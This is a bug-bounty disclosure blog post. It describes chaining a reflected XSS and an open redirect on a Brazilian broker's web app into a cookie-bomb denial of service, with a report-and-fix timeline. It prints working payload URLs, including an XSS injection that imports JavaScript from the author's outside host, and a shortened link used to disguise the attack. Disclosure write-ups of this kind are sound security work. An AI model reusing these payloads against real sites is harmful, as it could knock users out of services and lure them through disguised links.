---
layout: content
title: 'Chaining client-side vulnerabilities to make a web app unavailable'
description: ''
og_image: 
---

### Summary

Through an analysis on the web application of the broker of which I am a client (easynvenst.com.br) I was able to notice certain behaviors that led me to discover two client-side vulnerabilities that, if exploited by an attacker, could expose the legitimate users of the application to various risks, one of which is a kind of "unavailability".

```
Timeline
	•	PoC performed: 23/05/2020
	•	Reported Vulnerability: 24/05/2020
	•	Confirmed Vulnerability: 27/05/2020
	•	Vulnerability fix: 13/07/2020
	•	Publication of this article: xx/xx/xxxx
```

---

### Description

Recently while using the broker, I decided to generate an invitation link through the mobile app to send to a friend that resulted in:

![Image](/images/publications/nuinvest/1.png)


https://indique.easynvest.com.br?nome=heitor%20pinheiro&id=39fa50965ca74909ab75a5f5bfa5c9167cf0147adf8b434f9eb1403d080439d9

Out of curiosity, I accessed the invitation link and realized that the app received my name/surname as a parameter in the URL and reflected these values on the user's screen:


![Image](/images/publications/nuinvest/2.png)


Through this, I thought about the possibility of building an XSS payload that took advantage of this and after a few attempts I managed to arrive at something valid:

	•	https://indique.easynvest.com.br/?nome=<audio src/onerror=alert(1)>&id=1

![Image](/images/publications/nuinvest/3.png)


This XSS is somewhat restricted as it has several limitations:

	•	The first is that it is on a subdomain, which does not give me access to LocalStorage from the main domain;
	•	I have access to cookies, however all cookies with sensitive or critical information are set to HTTPOnly;
	•	It is of the "Reflected" type which makes it a little more difficult to propagate it;
	•	Virtually all useful information is in the main domain, where it has anti-CSRF tokens and XFO header set.

Through these limitations I decided that it was feasible to go a little deeper in the search and try to find some other vulnerability that I could use in a chain and be able to minimize these restrictions of this RXSS.

Directing my efforts to the main application, I started reading the JavaScript on the authentication screen and found an interesting parameter that led me to an Open Redirect:

	•	https://www.easynvest.com.br/autenticacao?redirect_url=https://google.com

<iframe width="700" height="612" src="https://www.youtube.com/embed/sN1J3py9aUo" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>

Well, through this Open Redirect in the main domain it is possible to minimize the restriction of spreading a malicious payload, but that still does not solve the other restrictions.
In search of a way to demonstrate an interesting impact with the combination of this RXSS + Open Redirect, I tried to use them to achieve an Account Takeover, Information Exfiltration and other forms of impact, but this was not possible since the application has a mechanism default MFA for any action that is classified as critical, such as: (a) alteration of email, (b) deletion of the account, (c) transfer/purchase/sale of investment funds; among others.

I spent a long time trying to show an interesting "exploitability" that used these two vulnerabilities but I always ran into some security feature that generated an impediment so I made the decision to use these two vulnerabilities to generate a Cookie Bomb attack that would make the application unavailable in case access via a malicious link sent to the user.
Basically the idea behind a Cookie Bomb attack is to send a request that contains a giant cookie to the application, causing the server to refuse any request from this user and not load the application itself, generating a denial of service.

A cookie has a 4k byte limit by default, it is possible to create many cookies and send them through the browser request, however the servers do not react very well to this type of scenario which makes the application inactive for the time determined by the cookie. or until the user manually removes the gigantic cookies.

If you are more interested in this vulnerability, I recommend reading the following articles:

	0.	https://homakov.blogspot.com/2014/01/cookie-bomb-or-lets-break-internet.html
	0.	https://blog.innerht.ml/tag/cookie-bomb/

---

### Proof of Concept

In practice the exploit would look like this:
	1.	First we need to serve JavaScript on the Internet that makes the creation of cookies in an abusive way for our target:
        •  Hosted on: https://heitorgouvea.me/public/payloads/bomb.js

![Image](/images/publications/nuinvest/4.png)

	2.	We need to get our RXSS to read/execute this JavaScript: https://indique.easynvest.com.br/?nome=><audio src="" onerror=import('//heitorgouvea.me/public/payloads/bomb.js');>&id=1
	3.	We need to direct the user to this malicious RXSS in the least suspicious way possible:
	    • With a URL shortener we can mask our payload: https://cutt.ly/syPnJXp

The final payload looks like this: https://www.easynvest.com.br/autenticacao?redirect_url=https://cutt.ly/syPnJXp

And this was the result:

<iframe width="700" height="612" src="https://www.youtube.com/embed/-L2pl1Ke_Lo" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>

### Impact

An attacker could use this chain of vulnerabilities to generate several scenarios that present some type of risk to users of the application, and this publication addressed only one of the possible scenarios where it shows the possibility that an attacker would be able to "make" the application unavailable for a certain group of users if they accessed the link sent by it.

---

### Conclusion

The effort to carry out this exploration is relatively small and simple, but the scope of this attack is possibly great. An attacker can easily exploit the vulnerabilities mentioned above and thus disseminate a link with a malicious payload that uses the vulnerabilities in this article that generates a denial of service, and it is possible that there are also other vulnerabilities that can be exploited from the scope illustrated here.

---

### References

[1]. https://portswigger.net/web-security/cross-site-scripting
[2]. https://owasp.org/www-community/attacks/xss/
[3]. https://portswigger.net/kb/issues/00500100_open-redirection-reflected
[4]. https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
[5]. https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
[6]. https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
[7]. https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html
[8]. https://en.wikipedia.org/wiki/HTTP_cookie
[9]. https://blog.innerht.ml/tag/cookie-bomb/
[10]. https://homakov.blogspot.com/2014/01/cookie-bomb-or-lets-break-internet.html